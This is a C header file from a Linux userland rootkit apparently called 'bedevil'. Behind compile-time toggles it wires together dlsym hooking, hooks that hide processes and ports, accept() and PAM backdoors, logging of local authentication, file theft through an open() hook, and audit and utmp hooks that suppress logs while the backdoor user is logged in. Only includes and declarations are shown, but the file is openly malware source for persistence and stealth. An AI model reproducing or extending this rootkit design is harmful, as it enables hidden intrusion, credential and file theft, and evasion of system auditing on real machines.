/*
    essential includes for the rootkit.
    if a header include is suffixed with a comment for
    a specific toggle, its variable placeholders
    will be read conditionally depending solely on
    the status of said toggle.
    i.e.: #include "hooks/blahblah.c" // [BLAH_TOGGLE]
 */

#ifndef INCLUDES_H
#define INCLUDES_H

#include "bedevil.h"

/* libdl.h provides essential symbol resolving functions.
 * (hook, call, getsym) not to mention the dlsym hook
 * itself. */
#include "hooks/libdl/libdl.h"
#include "util/util.h"  /* now include util.h */
#include "hiding/hiding.h"

#ifdef USE_ACCEPT_BD
#include "backdoor/accept.h" // [USE_ACCEPT_BD]
#endif

#ifdef USE_PAM_BD
#include "backdoor/pam.h" // [USE_PAM_BD]
#endif

#ifdef LOG_LOCAL_AUTH
#include "hooks/authlog/authlog.h" // [LOG_LOCAL_AUTH]
#endif

#ifdef HIDE_SELF
int kill(pid_t pid, int sig);
#include "hooks/kill.c"
long ptrace(void *request, pid_t pid, void *addr, void *data);
#include "hooks/ptrace.c"
#endif

#ifdef HIDE_PORTS
int socket(int domain, int type, int protocol);
#include "hooks/socket.c"
#endif

#include "hooks/exec/exec.h"
#include "hooks/open/open.h" // [FILE_STEAL]
#include "hooks/stat/stat.h"
//#include "hooks/rw/rw.h" // [LOG_SSH]
#include "hooks/dir/dir.h"
#include "hooks/ln/links.h"
#include "hooks/gid/gid.h"
#include "hooks/perms/perms.h"
#ifdef USE_PAM_BD
#include "hooks/pwd/pwd.h" // [USE_PAM_BD]

/* the functions in the following includes
 * are responsible for thwarting writing &
 * reading of logs when the backdoor user
 * is logged in. */
#include "hooks/audit/audit.h" // [USE_PAM_BD]
#include "hooks/utmp/utmp.h" // [USE_PAM_BD]
#endif

#endif